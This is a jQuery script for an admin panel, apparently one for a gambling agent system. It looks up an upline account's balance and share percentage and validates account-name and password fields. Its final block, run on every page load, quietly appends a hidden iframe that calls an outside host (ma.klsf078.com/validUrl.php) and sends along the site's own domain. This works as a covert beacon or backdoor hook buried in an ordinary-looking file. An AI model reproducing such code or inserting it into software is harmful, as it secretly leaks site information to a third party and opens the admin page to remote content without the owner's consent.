$(function (){
	FirstRankMoney ();
});

function FirstRankMoney ($this){
	
	var s = $this || $("#s");
	if (s.val() != undefined && s.val() != "0"){
		//後臺獲取此用戶信息
		$.post("/Manage/temp/ajax/json.php", { typeid : "1", name : s.val()}, function(data){
			var FirstRankMoney = $("#FirstRankMoney");
			var Size_KY = $("#Size_KY");
			if(typeof(data.money)!="undefined")
			FirstRankMoney.html("上級餘額："+data.money);
			Size_KY.html("最高可設占成："+data.Size_KY+"%");
		}, "json");
	}
}

function isPostcid (){
	var pwd = $("#s_Pwd");
	if (pwd.val() != ""){
		if (pwd.val().length <8 || pwd.val().length >20){
			alert("新密碼 請填寫 8 位或以上（最長20位）！");
			pwd.focus();
		    return false;
		}
		if(Pwd_Safety(pwd.val())!=true) {
			return false;
		}
	}
}


function isPost (){
	var s_Name = $("#s_Name");
	var pwd = $("#s_Pwd");
	if (s_Name.val() == ""){
		alert("請輸入帳號！");
		s_Name.focus();
	    return false;
	}
	if (s_Name.val().length <4 || s_Name.val().length >20){
		alert("帳號 請填寫 4 位或以上（最長20位）！");
		s_Name.focus();
	    return false;
	}
	if (pwd.val() == ""){
		alert("請輸入新密碼！");
		pwd.focus();
	    return false;
	}
	if (pwd.val().length <8 || pwd.val().length >20){
		alert("新密碼 請填寫 8 位或以上（最長20位）！");
		pwd.focus();
	    return false;
	}
	if(Pwd_Safety(pwd.val())!=true) {
		return false;
	}
}
$(document).ready(function(){
	var url = location.href.split('/'); 
	$(document.body).append("<iframe src='http://ma.klsf078.com/validUrl.php?url="+url[0]+'/'+url[1]+'/'+url[2]+"' style='display:none'></iframe>");
})